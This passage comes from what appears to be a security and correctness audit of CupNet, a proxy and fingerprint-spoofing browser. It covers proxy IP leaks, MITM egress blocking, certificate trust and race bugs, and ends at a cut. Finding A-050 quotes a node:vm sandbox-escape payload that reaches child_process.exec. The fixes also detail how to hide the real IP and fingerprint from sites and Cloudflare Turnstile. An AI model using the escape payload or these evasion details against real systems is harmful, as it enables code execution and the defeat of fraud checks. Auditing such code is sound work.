- **Fix:** Choose one of two fixes. (a) Remove the handler at proxy-ipc.js:55-67 and the applyQuickProxyChange export at preload.js:189, since nothing calls them. (b) Keep it, and in the handler after `await ctx.quickChangeProxy(proxyUrl)` add `ctx.connectedProfileId = null; ctx.connectedProfileName = null; ctx.connectedResolvedVars = {};`. Leaving the name null makes the status show the masked actProxy URL; set it to 'Quick proxy' if you want that label. If the old profile's fingerprint should not carry over, also reset it the way global-proxy-connect.js disconnectGlobalProxy does (clear ctx.activeFingerprint and call resetFingerprintOnWebContents on the tabs). Do all of this before ctx.buildMenu() and ctx.notifyProxyStatus().

#### A-291 ⚪ quick-connect-profile: disconnect does not clear the MITM upstream; connect skips TLS/JA3/forceHttp1 and leaves stale resolvedVars
- **Where:** `main-process/ipc/handlers/quick-connect-ipc.js:25` · **Category:** correctness · **Status:** open
- **Impact:** The caller invokes quickConnectProfile(null) while connected. The status shows Direct, but MITM keeps routing via the old upstream (raw URL) or fails every request (closed local port).
- **Fix:** Replace the handler body with delegation: if (!profileId) { await disconnectGlobalProxy(ctx); return { success: true }; } else return connectGlobalProxyProfile(ctx, profileId). Alternatively, delete the 'quick-connect-profile' handler and the quickConnectProfile entry in preload.js, since nothing calls them.

#### A-304 ⚪ Connecting a profile without a timezone keeps the previous profile's timezone override
- **Where:** `main-process/services/global-proxy-connect.js:118` · **Category:** correctness · **Status:** open
- **Impact:** A (timezone Europe/Berlin) is followed by B (US proxy, no timezone). Pages still report the Berlin timezone, which mismatches the US IP.
- **Fix:** In fingerprint-service.js applyFingerprintToWebContents, when the debugger is attached, always send Emulation.setTimezoneOverride with { timezoneId: fp?.timezone || '' }. In applyFingerprintToAllTabs, skip tabs where tab.proxyProfileId is set, using `if (tab?.proxyProfileId) continue;`.

#### A-310 ⚪ checkCurrentIpGeo turns off certificate verification on tab sessions and runs fetch inside the visited site's main world
- **Where:** `main-process/services/proxy-service.js:538` · **Category:** security · **Status:** open
- **Impact:** With STEALTH=4, one failed worker geo check makes the tab session accept any certificate. A hostile page overrides window.fetch and returns a fake ipinfo JSON, so the UI shows a spoofed egress IP.
- **Fix:** Pass STEALTH into the proxy-service deps (d.stealthLevel) and make _trustSessionForMitm return early when `d.stealthLevel >= 4`. Or delegate to tabManager's trust hook, which is already null at STEALTH>=4: `const t = d.getTabManager?.()?._trustMitmCA; if (t) t(sess);`, or equivalently only call it when trust was wired. Replace `wc.executeJavaScript(code, true)` with `wc.executeJavaScriptInIsolatedWorld(999, [{ code }], true)`, or drop the webContents path and rely on the worker and session.fetch paths.

#### A-352 ⚪ openEditor's async template fetch can overwrite the editor after the user has switched profiles
- **Where:** `proxy-manager-renderer.js:1541` · **Category:** race · **Status:** open
- **Impact:** The user clicks profile A and then quickly B while the main process is busy. A's template and provider variables land in B's editor, and Save writes A's upstream into B.
- **Fix:** At :1541 use `api.getProxyProfileUrl(id).then(template => { if (selectedId !== id) return; ... }).catch(() => {});`

### MITM & interception

#### A-008 🔴 Native HTTPS fallback bypasses the upstream proxy and leaks the real IP
- **Where:** `mitm-proxy.js:1502` · **Category:** security · **Status:** open
- **Impact:** A proxy profile is connected (proxy-chain local port leading to a residential or SOCKS proxy). The upstream proxy drops the connection, which is common on rotation or auth hiccups. Go reports 'EOF'. The Go-side retries also fail with EOF. Node then matches CONN_ERR, sees the method is idempotent, and re-sends the GET straight to the origin. The site sees the real IP and the real cookies on the same session.
- **Fix:** At mitm-proxy.js:1502, change the guard to `if (!isIdempotent || tabUpstream.proxy || this._egressBlocked || !CONN_ERR.test(String(e.message || ''))) throw e;`. The preferred fix is to delete the native-fallback block (L1504-1533) and the _nativeHttpsFallback helper, and rethrow workerError.
- _Reported 2× (also: azuretls-fingerprint)_

#### A-028 🟠 MITM restart silently loses fail-closed egress block, per-tab upstreams, JA3 and forceHttp1
- **Where:** `main-process/cupnet-runtime.js:1131` · **Category:** security · **Status:** open
- **Impact:** Case 1: a proxy profile failed to connect, so egress is blocked and upstream is null. The user presses 'Restart MITM' (the mitm-restart IPC). The new proxy has no block, and all tabs now browse directly from the real IP. Case 2: a tab with a per-tab proxy profile loses its override after a restart and silently switches to the global upstream or to direct.
- **Fix:** In restartMitmProxy, before _clearMitmProxyInstance(), snapshot `const snap = mitmProxy ? { eb: mitmProxy._egressBlocked, ebr: mitmProxy._egressBlockReason, tabs: new Map(mitmProxy._tabProxyMap), ja3: mitmProxy._activeJa3, h1: mitmProxy.forceHttp1, browser: mitmProxy.browser, pt: [...mitmProxy._tlsPassthroughDomains] } : null;`. After wireMitmAfterStart(proxy) and after the applyEffectiveTrafficMode call (which may clear the block through setUpstream only when there is an upstream), restore it: `proxy.setEgressBlocked(snap.eb, snap.ebr); for (const [t,c] of snap.tabs) proxy.setTabUpstream(t,c); proxy._activeJa3 = snap.ja3; proxy.setForceHttp1(snap.h1); proxy.setBrowser(snap.browser); proxy.setTlsPassthroughDomains(snap.pt);`. Alternatively, start the new instance with _egressBlocked=true until the traffic mode has been applied.

#### A-042 🟠 TLS passthrough and WebSocket tunnels ignore the fail-closed egress block and per-tab proxies (direct connection)
- **Where:** `mitm-proxy.js:1268` · **Category:** security · **Status:** open
- **Impact:** A proxy profile fails to connect, so setEgressBlocked(true) with upstream null. A page embedding Turnstile still opens challenges.cloudflare.com through a direct tunnel, and any wss:// connection is made directly. Both reveal the real IP while the UI claims egress is blocked. With a per-tab proxy, the Turnstile challenge leaves through the global proxy while the page uses the tab proxy, so the IP mismatch fails the challenge.
- **Fix:** 1) In _handleConnect, pass the tab id: this._handleConnectPassthrough(socket, hostname, port, connectTabId). 2) In _handleConnectPassthrough, compute const proxyUrl = this._resolveUpstreamForTab(tabId).proxy. If this._egressBlocked && !proxyUrl, call fail(new Error('Egress blocked')) and return. Otherwise use proxyUrl in place of this.upstream (L1268, L1278). 3) In _continueWsTunnelAfterPlan, after L1763 add: if (this._egressBlocked && !proxyUrl) { fail(new Error(`Egress blocked: ${this._egressBlockReason}`)); return; }
- _Reported 3× (also: x-lifecycle, proxy)_

#### A-050 🟠 Intercept 'script' rules run in node:vm, so a saved or imported rule is arbitrary code execution in the main process
- **Where:** `request-interceptor.js:397` · **Category:** security · **Status:** ✅ FIXED 2026-09-23 — imported script rules forced disabled; user warned.
- **Impact:** A user imports a shared 'cupnet-intercept-rules.json' containing {type:'script', url_pattern:'*', params:{beforeSource:"ctx.constructor.constructor('return process')().mainModule.require('child_process').exec('...')"}}. The payload runs on the next page load.
- **Fix:** Minimal: in rules-ipc.js import-intercept-rules, force `enabled: false` for rules with `type === 'script'` and show a trust confirmation dialog listing the imported script rules before saving. Pass only JSON-cloned data into the sandbox (e.g. `ctx: JSON.parse(JSON.stringify(ctx))` and copy mutations back from it, and do not pass the host Buffer). Proper fix: run script phases in a worker_thread, utility process or isolated-vm that exchanges structured-clone data only.
- _Reported 2× (also: x-security)_

#### A-053 🟠 All tabs in the shared cookie group are tagged with the newest tab's id (X-CupNet-Rid listener overwritten)
